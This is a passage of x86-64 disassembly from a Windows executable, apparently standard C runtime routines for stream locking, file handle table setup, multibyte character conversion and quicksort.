   140009518:	74 05                	je     0x14000951f
   14000951a:	f0 83 63 14 fd       	lock andl $0xfffffffd,0x14(%rbx)
   14000951f:	33 c0                	xor    %eax,%eax
   140009521:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009526:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000952b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009530:	48 83 c4 20          	add    $0x20,%rsp
   140009534:	5f                   	pop    %rdi
   140009535:	c3                   	ret
   140009536:	cc                   	int3
   140009537:	cc                   	int3
   140009538:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000953d:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   140009542:	55                   	push   %rbp
   140009543:	48 8b ec             	mov    %rsp,%rbp
   140009546:	48 83 ec 60          	sub    $0x60,%rsp
   14000954a:	48 83 65 c0 00       	andq   $0x0,-0x40(%rbp)
   14000954f:	48 8b d9             	mov    %rcx,%rbx
   140009552:	83 3d bb f9 00 00 00 	cmpl   $0x0,0xf9bb(%rip)        # 0x140018f14
   140009559:	c6 45 d0 00          	movb   $0x0,-0x30(%rbp)
   14000955d:	c6 45 e8 00          	movb   $0x0,-0x18(%rbp)
   140009561:	c6 45 f0 00          	movb   $0x0,-0x10(%rbp)
   140009565:	c6 45 f8 00          	movb   $0x0,-0x8(%rbp)
   140009569:	75 10                	jne    0x14000957b
   14000956b:	0f 10 05 e6 f1 00 00 	movups 0xf1e6(%rip),%xmm0        # 0x140018758
   140009572:	c6 45 e8 01          	movb   $0x1,-0x18(%rbp)
   140009576:	f3 0f 7f 45 d8       	movdqu %xmm0,-0x28(%rbp)
   14000957b:	48 85 db             	test   %rbx,%rbx
   14000957e:	75 0b                	jne    0x14000958b
   140009580:	33 c9                	xor    %ecx,%ecx
   140009582:	e8 c5 fe ff ff       	call   0x14000944c
   140009587:	8b f8                	mov    %eax,%edi
   140009589:	eb 31                	jmp    0x1400095bc
   14000958b:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   14000958f:	e8 18 ff ff ff       	call   0x1400094ac
   140009594:	85 c0                	test   %eax,%eax
   140009596:	74 05                	je     0x14000959d
   140009598:	83 cf ff             	or     $0xffffffff,%edi
   14000959b:	eb 1f                	jmp    0x1400095bc
   14000959d:	8b 43 14             	mov    0x14(%rbx),%eax
   1400095a0:	c1 e8 0b             	shr    $0xb,%eax
   1400095a3:	a8 01                	test   $0x1,%al
   1400095a5:	74 13                	je     0x1400095ba
   1400095a7:	48 8b cb             	mov    %rbx,%rcx
   1400095aa:	e8 49 04 00 00       	call   0x1400099f8
   1400095af:	8b c8                	mov    %eax,%ecx
   1400095b1:	e8 82 0e 00 00       	call   0x14000a438
   1400095b6:	85 c0                	test   %eax,%eax
   1400095b8:	75 de                	jne    0x140009598
   1400095ba:	33 ff                	xor    %edi,%edi
   1400095bc:	80 7d e8 02          	cmpb   $0x2,-0x18(%rbp)
   1400095c0:	75 0b                	jne    0x1400095cd
   1400095c2:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
   1400095c6:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400095cd:	80 7d f0 00          	cmpb   $0x0,-0x10(%rbp)
   1400095d1:	74 0f                	je     0x1400095e2
   1400095d3:	8b 5d ec             	mov    -0x14(%rbp),%ebx
   1400095d6:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400095da:	e8 51 c1 ff ff       	call   0x140005730
   1400095df:	89 58 20             	mov    %ebx,0x20(%rax)
   1400095e2:	80 7d f8 00          	cmpb   $0x0,-0x8(%rbp)
   1400095e6:	74 0f                	je     0x1400095f7
   1400095e8:	8b 5d f4             	mov    -0xc(%rbp),%ebx
   1400095eb:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400095ef:	e8 3c c1 ff ff       	call   0x140005730
   1400095f4:	89 58 24             	mov    %ebx,0x24(%rax)
   1400095f7:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   1400095fc:	8b c7                	mov    %edi,%eax
   1400095fe:	48 8b 7c 24 78       	mov    0x78(%rsp),%rdi
   140009603:	48 83 c4 60          	add    $0x60,%rsp
   140009607:	5d                   	pop    %rbp
   140009608:	c3                   	ret
   140009609:	cc                   	int3
   14000960a:	cc                   	int3
   14000960b:	cc                   	int3
   14000960c:	b1 01                	mov    $0x1,%cl
   14000960e:	e9 39 fe ff ff       	jmp    0x14000944c
   140009613:	cc                   	int3
   140009614:	48 8b c4             	mov    %rsp,%rax
   140009617:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000961b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000961f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140009623:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009627:	41 56                	push   %r14
   140009629:	48 83 ec 20          	sub    $0x20,%rsp
   14000962d:	8b 05 95 01 01 00    	mov    0x10195(%rip),%eax        # 0x1400197c8
   140009633:	33 db                	xor    %ebx,%ebx
   140009635:	bf 03 00 00 00       	mov    $0x3,%edi
   14000963a:	85 c0                	test   %eax,%eax
   14000963c:	75 07                	jne    0x140009645
   14000963e:	b8 00 02 00 00       	mov    $0x200,%eax
   140009643:	eb 05                	jmp    0x14000964a
   140009645:	3b c7                	cmp    %edi,%eax
   140009647:	0f 4c c7             	cmovl  %edi,%eax
   14000964a:	48 63 c8             	movslq %eax,%rcx
   14000964d:	ba 08 00 00 00       	mov    $0x8,%edx
   140009652:	89 05 70 01 01 00    	mov    %eax,0x10170(%rip)        # 0x1400197c8
   140009658:	e8 57 cf ff ff       	call   0x1400065b4
   14000965d:	33 c9                	xor    %ecx,%ecx
   14000965f:	48 89 05 6a 01 01 00 	mov    %rax,0x1016a(%rip)        # 0x1400197d0
   140009666:	e8 c1 cf ff ff       	call   0x14000662c
   14000966b:	48 39 1d 5e 01 01 00 	cmp    %rbx,0x1015e(%rip)        # 0x1400197d0
   140009672:	75 2f                	jne    0x1400096a3
   140009674:	ba 08 00 00 00       	mov    $0x8,%edx
   140009679:	89 3d 49 01 01 00    	mov    %edi,0x10149(%rip)        # 0x1400197c8
   14000967f:	48 8b cf             	mov    %rdi,%rcx
   140009682:	e8 2d cf ff ff       	call   0x1400065b4
   140009687:	33 c9                	xor    %ecx,%ecx
   140009689:	48 89 05 40 01 01 00 	mov    %rax,0x10140(%rip)        # 0x1400197d0
   140009690:	e8 97 cf ff ff       	call   0x14000662c
   140009695:	48 39 1d 34 01 01 00 	cmp    %rbx,0x10134(%rip)        # 0x1400197d0
   14000969c:	75 05                	jne    0x1400096a3
   14000969e:	83 c8 ff             	or     $0xffffffff,%eax
   1400096a1:	eb 75                	jmp    0x140009718
   1400096a3:	48 8b eb             	mov    %rbx,%rbp
   1400096a6:	48 8d 35 8b f1 00 00 	lea    0xf18b(%rip),%rsi        # 0x140018838
   1400096ad:	4c 8d 35 6c f1 00 00 	lea    0xf16c(%rip),%r14        # 0x140018820
   1400096b4:	49 8d 4e 30          	lea    0x30(%r14),%rcx
   1400096b8:	45 33 c0             	xor    %r8d,%r8d
   1400096bb:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400096c0:	e8 ab f4 ff ff       	call   0x140008b70
   1400096c5:	48 8b 05 04 01 01 00 	mov    0x10104(%rip),%rax        # 0x1400197d0
   1400096cc:	4c 8d 05 1d fb 00 00 	lea    0xfb1d(%rip),%r8        # 0x1400191f0
   1400096d3:	48 8b d5             	mov    %rbp,%rdx
   1400096d6:	48 c1 fa 06          	sar    $0x6,%rdx
   1400096da:	4c 89 34 03          	mov    %r14,(%rbx,%rax,1)
   1400096de:	48 8b c5             	mov    %rbp,%rax
   1400096e1:	83 e0 3f             	and    $0x3f,%eax
   1400096e4:	48 8d 0c c0          	lea    (%rax,%rax,8),%rcx
   1400096e8:	49 8b 04 d0          	mov    (%r8,%rdx,8),%rax
   1400096ec:	48 8b 4c c8 28       	mov    0x28(%rax,%rcx,8),%rcx
   1400096f1:	48 83 c1 02          	add    $0x2,%rcx
   1400096f5:	48 83 f9 02          	cmp    $0x2,%rcx
   1400096f9:	77 06                	ja     0x140009701
   1400096fb:	c7 06 fe ff ff ff    	movl   $0xfffffffe,(%rsi)
   140009701:	48 ff c5             	inc    %rbp
   140009704:	49 83 c6 58          	add    $0x58,%r14
   140009708:	48 83 c3 08          	add    $0x8,%rbx
   14000970c:	48 83 c6 58          	add    $0x58,%rsi
   140009710:	48 83 ef 01          	sub    $0x1,%rdi
   140009714:	75 9e                	jne    0x1400096b4
   140009716:	33 c0                	xor    %eax,%eax
   140009718:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000971d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140009722:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009727:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000972c:	48 83 c4 20          	add    $0x20,%rsp
   140009730:	41 5e                	pop    %r14
   140009732:	c3                   	ret
   140009733:	cc                   	int3
   140009734:	40 53                	rex push %rbx
   140009736:	48 83 ec 20          	sub    $0x20,%rsp
   14000973a:	e8 cd fe ff ff       	call   0x14000960c
   14000973f:	e8 dc 19 00 00       	call   0x14000b120
   140009744:	33 db                	xor    %ebx,%ebx
   140009746:	48 8b 0d 83 00 01 00 	mov    0x10083(%rip),%rcx        # 0x1400197d0
   14000974d:	48 8b 0c 0b          	mov    (%rbx,%rcx,1),%rcx
   140009751:	e8 7e 1a 00 00       	call   0x14000b1d4
   140009756:	48 8b 05 73 00 01 00 	mov    0x10073(%rip),%rax        # 0x1400197d0
   14000975d:	48 8b 0c 03          	mov    (%rbx,%rax,1),%rcx
   140009761:	48 83 c1 30          	add    $0x30,%rcx
   140009765:	ff 15 45 49 00 00    	call   *0x4945(%rip)        # 0x14000e0b0
   14000976b:	48 83 c3 08          	add    $0x8,%rbx
   14000976f:	48 83 fb 18          	cmp    $0x18,%rbx
   140009773:	75 d1                	jne    0x140009746
   140009775:	48 8b 0d 54 00 01 00 	mov    0x10054(%rip),%rcx        # 0x1400197d0
   14000977c:	e8 ab ce ff ff       	call   0x14000662c
   140009781:	48 83 25 47 00 01 00 	andq   $0x0,0x10047(%rip)        # 0x1400197d0
   140009788:	00 
   140009789:	48 83 c4 20          	add    $0x20,%rsp
   14000978d:	5b                   	pop    %rbx
   14000978e:	c3                   	ret
   14000978f:	cc                   	int3
   140009790:	48 83 c1 30          	add    $0x30,%rcx
   140009794:	48 ff 25 05 49 00 00 	rex.W jmp *0x4905(%rip)        # 0x14000e0a0
   14000979b:	cc                   	int3
   14000979c:	48 83 c1 30          	add    $0x30,%rcx
   1400097a0:	48 ff 25 01 49 00 00 	rex.W jmp *0x4901(%rip)        # 0x14000e0a8
   1400097a7:	cc                   	int3
   1400097a8:	40 53                	rex push %rbx
   1400097aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400097ae:	48 8b 05 43 fe 00 00 	mov    0xfe43(%rip),%rax        # 0x1400195f8
   1400097b5:	48 8b da             	mov    %rdx,%rbx
   1400097b8:	48 39 02             	cmp    %rax,(%rdx)
   1400097bb:	74 16                	je     0x1400097d3
   1400097bd:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   1400097c3:	85 05 47 f0 00 00    	test   %eax,0xf047(%rip)        # 0x140018810
   1400097c9:	75 08                	jne    0x1400097d3
   1400097cb:	e8 90 f0 ff ff       	call   0x140008860
   1400097d0:	48 89 03             	mov    %rax,(%rbx)
   1400097d3:	48 83 c4 20          	add    $0x20,%rsp
   1400097d7:	5b                   	pop    %rbx
   1400097d8:	c3                   	ret
   1400097d9:	cc                   	int3
   1400097da:	cc                   	int3
   1400097db:	cc                   	int3
   1400097dc:	40 53                	rex push %rbx
   1400097de:	48 83 ec 20          	sub    $0x20,%rsp
   1400097e2:	48 8d 05 0f fe 00 00 	lea    0xfe0f(%rip),%rax        # 0x1400195f8
   1400097e9:	48 8b da             	mov    %rdx,%rbx
   1400097ec:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   1400097f0:	48 39 02             	cmp    %rax,(%rdx)
   1400097f3:	74 16                	je     0x14000980b
   1400097f5:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   1400097fb:	85 05 0f f0 00 00    	test   %eax,0xf00f(%rip)        # 0x140018810
   140009801:	75 08                	jne    0x14000980b
   140009803:	e8 58 f0 ff ff       	call   0x140008860
   140009808:	48 89 03             	mov    %rax,(%rbx)
   14000980b:	48 83 c4 20          	add    $0x20,%rsp
   14000980f:	5b                   	pop    %rbx
   140009810:	c3                   	ret
   140009811:	cc                   	int3
   140009812:	cc                   	int3
   140009813:	cc                   	int3
   140009814:	40 53                	rex push %rbx
   140009816:	48 83 ec 20          	sub    $0x20,%rsp
   14000981a:	48 8b 05 47 f7 00 00 	mov    0xf747(%rip),%rax        # 0x140018f68
   140009821:	48 8b da             	mov    %rdx,%rbx
   140009824:	48 39 02             	cmp    %rax,(%rdx)
   140009827:	74 16                	je     0x14000983f
   140009829:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   14000982f:	85 05 db ef 00 00    	test   %eax,0xefdb(%rip)        # 0x140018810
   140009835:	75 08                	jne    0x14000983f
   140009837:	e8 b8 dc ff ff       	call   0x1400074f4
   14000983c:	48 89 03             	mov    %rax,(%rbx)
   14000983f:	48 83 c4 20          	add    $0x20,%rsp
   140009843:	5b                   	pop    %rbx
   140009844:	c3                   	ret
   140009845:	cc                   	int3
   140009846:	cc                   	int3
   140009847:	cc                   	int3
   140009848:	40 53                	rex push %rbx
   14000984a:	48 83 ec 20          	sub    $0x20,%rsp
   14000984e:	48 8d 05 13 f7 00 00 	lea    0xf713(%rip),%rax        # 0x140018f68
   140009855:	48 8b da             	mov    %rdx,%rbx
   140009858:	4a 8b 04 c0          	mov    (%rax,%r8,8),%rax
   14000985c:	48 39 02             	cmp    %rax,(%rdx)
   14000985f:	74 16                	je     0x140009877
   140009861:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140009867:	85 05 a3 ef 00 00    	test   %eax,0xefa3(%rip)        # 0x140018810
   14000986d:	75 08                	jne    0x140009877
   14000986f:	e8 80 dc ff ff       	call   0x1400074f4
   140009874:	48 89 03             	mov    %rax,(%rbx)
   140009877:	48 83 c4 20          	add    $0x20,%rsp
   14000987b:	5b                   	pop    %rbx
   14000987c:	c3                   	ret
   14000987d:	cc                   	int3
   14000987e:	cc                   	int3
   14000987f:	cc                   	int3
   140009880:	48 8b c4             	mov    %rsp,%rax
   140009883:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009887:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000988b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000988f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140009893:	41 56                	push   %r14
   140009895:	48 83 ec 30          	sub    $0x30,%rsp
   140009899:	45 33 f6             	xor    %r14d,%r14d
   14000989c:	49 8b d9             	mov    %r9,%rbx
   14000989f:	49 8b e8             	mov    %r8,%rbp
   1400098a2:	48 8b f2             	mov    %rdx,%rsi
   1400098a5:	48 8b f9             	mov    %rcx,%rdi
   1400098a8:	48 85 d2             	test   %rdx,%rdx
   1400098ab:	0f 84 23 01 00 00    	je     0x1400099d4
   1400098b1:	4d 85 c0             	test   %r8,%r8
   1400098b4:	0f 84 1a 01 00 00    	je     0x1400099d4
   1400098ba:	44 38 32             	cmp    %r14b,(%rdx)
   1400098bd:	75 12                	jne    0x1400098d1
   1400098bf:	48 85 c9             	test   %rcx,%rcx
   1400098c2:	0f 84 13 01 00 00    	je     0x1400099db
   1400098c8:	66 44 89 31          	mov    %r14w,(%rcx)
   1400098cc:	e9 0a 01 00 00       	jmp    0x1400099db
   1400098d1:	45 38 71 28          	cmp    %r14b,0x28(%r9)
   1400098d5:	75 08                	jne    0x1400098df
   1400098d7:	48 8b cb             	mov    %rbx,%rcx
   1400098da:	e8 c1 be ff ff       	call   0x1400057a0
   1400098df:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400098e3:	44 8b 52 0c          	mov    0xc(%rdx),%r10d
   1400098e7:	41 81 fa e9 fd 00 00 	cmp    $0xfde9,%r10d
   1400098ee:	75 27                	jne    0x140009917
   1400098f0:	4c 8d 0d f1 fe 00 00 	lea    0xfef1(%rip),%r9        # 0x1400197e8
   1400098f7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400098fc:	4c 8b c5             	mov    %rbp,%r8
   1400098ff:	48 8b d6             	mov    %rsi,%rdx
   140009902:	48 8b cf             	mov    %rdi,%rcx
   140009905:	e8 6a 19 00 00       	call   0x14000b274
   14000990a:	83 c9 ff             	or     $0xffffffff,%ecx
   14000990d:	85 c0                	test   %eax,%eax
   14000990f:	0f 48 c1             	cmovs  %ecx,%eax
   140009912:	e9 c6 00 00 00       	jmp    0x1400099dd
   140009917:	4c 39 b2 38 01 00 00 	cmp    %r14,0x138(%rdx)
   14000991e:	75 14                	jne    0x140009934
   140009920:	48 85 ff             	test   %rdi,%rdi
   140009923:	0f 84 a4 00 00 00    	je     0x1400099cd
   140009929:	0f b6 06             	movzbl (%rsi),%eax
   14000992c:	66 89 07             	mov    %ax,(%rdi)
   14000992f:	e9 99 00 00 00       	jmp    0x1400099cd
   140009934:	0f b6 0e             	movzbl (%rsi),%ecx
   140009937:	48 8b 02             	mov    (%rdx),%rax
   14000993a:	66 44 39 34 48       	cmp    %r14w,(%rax,%rcx,2)
   14000993f:	7d 61                	jge    0x1400099a2
   140009941:	44 8b 4a 08          	mov    0x8(%rdx),%r9d
   140009945:	41 83 f9 01          	cmp    $0x1,%r9d
   140009949:	7e 2b                	jle    0x140009976
   14000994b:	41 3b e9             	cmp    %r9d,%ebp
   14000994e:	7c 26                	jl     0x140009976
   140009950:	41 8b c6             	mov    %r14d,%eax
   140009953:	48 85 ff             	test   %rdi,%rdi
   140009956:	4c 8b c6             	mov    %rsi,%r8
   140009959:	ba 09 00 00 00       	mov    $0x9,%edx
   14000995e:	0f 95 c0             	setne  %al
   140009961:	41 8b ca             	mov    %r10d,%ecx
   140009964:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140009968:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000996d:	e8 86 de ff ff       	call   0x1400077f8
   140009972:	85 c0                	test   %eax,%eax
   140009974:	75 13                	jne    0x140009989
   140009976:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000997a:	48 63 48 08          	movslq 0x8(%rax),%rcx
   14000997e:	48 3b e9             	cmp    %rcx,%rbp
   140009981:	72 0f                	jb     0x140009992
   140009983:	44 38 76 01          	cmp    %r14b,0x1(%rsi)
   140009987:	74 09                	je     0x140009992
   140009989:	48 8b 43 18          	mov    0x18(%rbx),%rax
   14000998d:	8b 40 08             	mov    0x8(%rax),%eax
   140009990:	eb 4b                	jmp    0x1400099dd
   140009992:	c6 43 30 01          	movb   $0x1,0x30(%rbx)
   140009996:	83 c8 ff             	or     $0xffffffff,%eax
   140009999:	c7 43 2c 2a 00 00 00 	movl   $0x2a,0x2c(%rbx)
   1400099a0:	eb 3b                	jmp    0x1400099dd
   1400099a2:	41 8b c6             	mov    %r14d,%eax
   1400099a5:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   1400099ab:	48 85 ff             	test   %rdi,%rdi
   1400099ae:	4c 8b c6             	mov    %rsi,%r8
   1400099b1:	41 8b ca             	mov    %r10d,%ecx
   1400099b4:	0f 95 c0             	setne  %al
   1400099b7:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400099bb:	41 8d 51 08          	lea    0x8(%r9),%edx
   1400099bf:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400099c4:	e8 2f de ff ff       	call   0x1400077f8
   1400099c9:	85 c0                	test   %eax,%eax
   1400099cb:	74 c5                	je     0x140009992
   1400099cd:	b8 01 00 00 00       	mov    $0x1,%eax
   1400099d2:	eb 09                	jmp    0x1400099dd
   1400099d4:	4c 89 35 0d fe 00 00 	mov    %r14,0xfe0d(%rip)        # 0x1400197e8
   1400099db:	33 c0                	xor    %eax,%eax
   1400099dd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400099e2:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   1400099e7:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   1400099ec:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   1400099f1:	48 83 c4 30          	add    $0x30,%rsp
   1400099f5:	41 5e                	pop    %r14
   1400099f7:	c3                   	ret
   1400099f8:	48 83 ec 28          	sub    $0x28,%rsp
   1400099fc:	48 85 c9             	test   %rcx,%rcx
   1400099ff:	75 15                	jne    0x140009a16
   140009a01:	e8 8e cb ff ff       	call   0x140006594
   140009a06:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009a0c:	e8 2b c9 ff ff       	call   0x14000633c
   140009a11:	83 c8 ff             	or     $0xffffffff,%eax
   140009a14:	eb 03                	jmp    0x140009a19
   140009a16:	8b 41 18             	mov    0x18(%rcx),%eax
   140009a19:	48 83 c4 28          	add    $0x28,%rsp
   140009a1d:	c3                   	ret
   140009a1e:	cc                   	int3
   140009a1f:	cc                   	int3
   140009a20:	41 54                	push   %r12
   140009a22:	41 55                	push   %r13
   140009a24:	41 56                	push   %r14
   140009a26:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   140009a2d:	48 8b 05 0c e6 00 00 	mov    0xe60c(%rip),%rax        # 0x140018040
   140009a34:	48 33 c4             	xor    %rsp,%rax
   140009a37:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   140009a3e:	00 
   140009a3f:	4d 8b e1             	mov    %r9,%r12
   140009a42:	4d 8b f0             	mov    %r8,%r14
   140009a45:	4c 8b e9             	mov    %rcx,%r13
   140009a48:	48 85 c9             	test   %rcx,%rcx
   140009a4b:	75 1a                	jne    0x140009a67
   140009a4d:	48 85 d2             	test   %rdx,%rdx
   140009a50:	74 15                	je     0x140009a67
   140009a52:	e8 3d cb ff ff       	call   0x140006594
   140009a57:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009a5d:	e8 da c8 ff ff       	call   0x14000633c
   140009a62:	e9 a9 03 00 00       	jmp    0x140009e10
   140009a67:	4d 85 f6             	test   %r14,%r14
   140009a6a:	74 e6                	je     0x140009a52
   140009a6c:	4d 85 e4             	test   %r12,%r12
   140009a6f:	74 e1                	je     0x140009a52
   140009a71:	48 83 fa 02          	cmp    $0x2,%rdx
   140009a75:	0f 82 95 03 00 00    	jb     0x140009e10
   140009a7b:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   140009a82:	00 
   140009a83:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   140009a8a:	00 
   140009a8b:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   140009a92:	00 
   140009a93:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   140009a9a:	00 
   140009a9b:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   140009aa2:	00 
   140009aa3:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   140009aa7:	4d 0f af fe          	imul   %r14,%r15
   140009aab:	4c 03 f9             	add    %rcx,%r15
   140009aae:	33 c9                	xor    %ecx,%ecx
   140009ab0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009ab5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140009abc:	00 00 00 00 
   140009ac0:	33 d2                	xor    %edx,%edx
   140009ac2:	49 8b c7             	mov    %r15,%rax
   140009ac5:	49 2b c5             	sub    %r13,%rax
   140009ac8:	49 f7 f6             	div    %r14
   140009acb:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140009acf:	48 83 fb 08          	cmp    $0x8,%rbx
   140009ad3:	0f 87 9b 00 00 00    	ja     0x140009b74
   140009ad9:	4d 3b fd             	cmp    %r13,%r15
   140009adc:	76 75                	jbe    0x140009b53
   140009ade:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   140009ae2:	49 8b dd             	mov    %r13,%rbx
   140009ae5:	48 8b fe             	mov    %rsi,%rdi
   140009ae8:	49 3b f7             	cmp    %r15,%rsi
   140009aeb:	77 2a                	ja     0x140009b17
   140009aed:	0f 1f 00             	nopl   (%rax)
   140009af0:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009af7:	b7 75 93 
   140009afa:	48 8b d3             	mov    %rbx,%rdx
   140009afd:	48 8b cf             	mov    %rdi,%rcx
   140009b00:	49 8b c4             	mov    %r12,%rax
   140009b03:	ff 15 5f 47 00 00    	call   *0x475f(%rip)        # 0x14000e268
   140009b09:	85 c0                	test   %eax,%eax
   140009b0b:	48 0f 4f df          	cmovg  %rdi,%rbx
   140009b0f:	49 03 fe             	add    %r14,%rdi
   140009b12:	49 3b ff             	cmp    %r15,%rdi
   140009b15:	76 d9                	jbe    0x140009af0
   140009b17:	4d 8b c6             	mov    %r14,%r8
   140009b1a:	49 8b d7             	mov    %r15,%rdx
   140009b1d:	49 3b df             	cmp    %r15,%rbx
   140009b20:	74 24                	je     0x140009b46
   140009b22:	49 2b df             	sub    %r15,%rbx
   140009b25:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140009b2c:	00 00 00 00 
   140009b30:	0f b6 02             	movzbl (%rdx),%eax
   140009b33:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   140009b37:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   140009b3a:	88 0a                	mov    %cl,(%rdx)
   140009b3c:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009b40:	49 83 e8 01          	sub    $0x1,%r8
   140009b44:	75 ea                	jne    0x140009b30
   140009b46:	4d 2b fe             	sub    %r14,%r15
   140009b49:	4d 3b fd             	cmp    %r13,%r15
   140009b4c:	77 94                	ja     0x140009ae2
   140009b4e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009b53:	48 83 e9 01          	sub    $0x1,%rcx
   140009b57:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009b5c:	0f 88 86 02 00 00    	js     0x140009de8
   140009b62:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   140009b67:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   140009b6e:	00 
   140009b6f:	e9 4c ff ff ff       	jmp    0x140009ac0
   140009b74:	48 d1 eb             	shr    $1,%rbx
   140009b77:	49 0f af de          	imul   %r14,%rbx
   140009b7b:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   140009b7f:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009b86:	b7 75 93 
   140009b89:	48 8b d6             	mov    %rsi,%rdx
   140009b8c:	49 8b cd             	mov    %r13,%rcx
   140009b8f:	49 8b c4             	mov    %r12,%rax
   140009b92:	ff 15 d0 46 00 00    	call   *0x46d0(%rip)        # 0x14000e268
   140009b98:	85 c0                	test   %eax,%eax
   140009b9a:	7e 2f                	jle    0x140009bcb
   140009b9c:	4d 8b ce             	mov    %r14,%r9
   140009b9f:	4c 8b c6             	mov    %rsi,%r8
   140009ba2:	4c 3b ee             	cmp    %rsi,%r13
   140009ba5:	74 24                	je     0x140009bcb
   140009ba7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140009bae:	00 00 
   140009bb0:	41 0f b6 00          	movzbl (%r8),%eax
   140009bb4:	49 8b d0             	mov    %r8,%rdx
   140009bb7:	48 2b d3             	sub    %rbx,%rdx
   140009bba:	0f b6 0a             	movzbl (%rdx),%ecx
   140009bbd:	88 02                	mov    %al,(%rdx)
   140009bbf:	41 88 08             	mov    %cl,(%r8)
   140009bc2:	49 ff c0             	inc    %r8
   140009bc5:	49 83 e9 01          	sub    $0x1,%r9
   140009bc9:	75 e5                	jne    0x140009bb0
   140009bcb:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009bd2:	b7 75 93 
   140009bd5:	49 8b d7             	mov    %r15,%rdx
   140009bd8:	49 8b cd             	mov    %r13,%rcx
   140009bdb:	49 8b c4             	mov    %r12,%rax
   140009bde:	ff 15 84 46 00 00    	call   *0x4684(%rip)        # 0x14000e268
   140009be4:	85 c0                	test   %eax,%eax
   140009be6:	7e 30                	jle    0x140009c18
   140009be8:	4d 8b c6             	mov    %r14,%r8
   140009beb:	49 8b d7             	mov    %r15,%rdx
   140009bee:	4d 3b ef             	cmp    %r15,%r13
   140009bf1:	74 25                	je     0x140009c18
   140009bf3:	4d 8b cd             	mov    %r13,%r9
   140009bf6:	4d 2b cf             	sub    %r15,%r9
   140009bf9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140009c00:	0f b6 02             	movzbl (%rdx),%eax
   140009c03:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009c08:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   140009c0c:	88 0a                	mov    %cl,(%rdx)
   140009c0e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009c12:	49 83 e8 01          	sub    $0x1,%r8
   140009c16:	75 e8                	jne    0x140009c00
   140009c18:	49 ba 70 89 de 5e 95 	movabs $0x9375b7955ede8970,%r10
   140009c1f:	b7 75 93 
   140009c22:	49 8b d7             	mov    %r15,%rdx
   140009c25:	48 8b ce             	mov    %rsi,%rcx
   140009c28:	49 8b c4             	mov    %r12,%rax
